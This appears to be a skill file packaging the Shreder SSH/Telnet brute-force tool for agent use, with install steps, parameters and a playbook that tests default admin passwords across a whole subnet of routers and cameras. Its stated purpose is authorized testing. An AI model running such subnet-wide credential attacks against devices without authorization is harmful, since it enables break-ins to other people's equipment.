---
name: shreder-ssh-brute
description: "Shreder: IoT default password batch testing. Signals: password cracking, hash cracking, threads, protocol."
zh-signals: "Shreder: IoT 默认口令批量。信号:密码破解,哈希破解,线程,协议。"
when-to-use: >-
  Use when testing authorized IoT or network devices for default and weak SSH or Telnet
  credentials using username and password lists.
---

# Shreder

- Attack Category: C25 Hash and Password Cracking
- Upstream Repository: https://github.com/EntySec/Shreder
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install shreder
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `shreder 192.168.1.1 -u admin -p pass.txt` | SSH/Telnet brute force |
| `-u admin -p p.txt -t 50` | Threads |
| `-s telnet` | Protocol |

## Attack Scenario Playbook

### Batch IoT Default Password Testing

```bash
shreder 10.0.0.0/24 -u admin -p top100.txt
# Routers and cameras
```

## Notes

By EntySec, high-speed SSH/Telnet brute forcing.
